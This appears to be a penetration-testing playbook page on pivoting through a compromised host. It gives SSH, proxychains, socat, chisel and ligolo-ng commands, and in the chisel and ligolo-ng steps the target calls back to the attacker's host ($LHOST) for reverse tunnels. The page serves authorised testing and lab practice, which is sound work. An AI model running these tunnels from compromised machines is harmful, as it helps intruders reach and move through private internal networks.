---
summary: Pivoting & tunneling — reach internal hosts/ports through a foothold with SSH, chisel, ligolo, proxychains.
status: active
tags: [security, playbook, pivoting, tunneling]
private: false
---

# Pivoting & Tunneling

After a foothold, the interesting network is behind it. Turn the compromised host into your route in. `filtered` ports from the initial scan are often reachable now.

## Enumerate the internal view

```bash
ip a; arp -a; cat /etc/hosts        # what networks/hosts does this box see?
ss -tlnp                            # local-only services (127.0.0.1:3000 ...)
# sweep the internal subnet without nmap on-box:
for i in $(seq 1 254); do (ping -c1 -W1 10.10.20.$i >/dev/null && echo up 10.10.20.$i &); done
```

## SSH tunnels (when you have SSH access)

```bash
ssh -L 8080:127.0.0.1:3000 user@$PIVOT     # local: your :8080 -> pivot's :3000
ssh -D 1080 user@$PIVOT                     # dynamic SOCKS proxy on :1080
ssh -R 9001:127.0.0.1:80 user@$PIVOT        # remote: expose your service to pivot
```

Then `proxychains <tool>` with `socks5 127.0.0.1 1080` in `/etc/proxychains4.conf`.

## chisel (no SSH — most common on HTB)

```bash
# attacker (server)
./chisel server -p 8000 --reverse
# target (client) -> reverse SOCKS back to you
./chisel client $LHOST:8000 R:1080:socks
# now: proxychains nmap -sT -Pn 10.10.20.0/24
```

## ligolo-ng (cleanest — full TUN, no proxychains)

```bash
# attacker
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert
# add route to the internal subnet via the ligolo iface, then on target:
./agent -connect $LHOST:11601 -ignore-cert
# reach 10.10.20.5 directly with any local tool — no wrapper
```

## Single-port quickies

```bash
socat TCP-LISTEN:8080,fork TCP:127.0.0.1:3000     # expose a bound-local port
```

## Related

- [Pentest Playbook — Index](kb://11-security-playbook-pentest-playbook-index)
- [Recon & Enumeration](kb://11-security-playbook-recon-enumeration)
- [Active Directory](kb://11-security-playbook-active-directory)
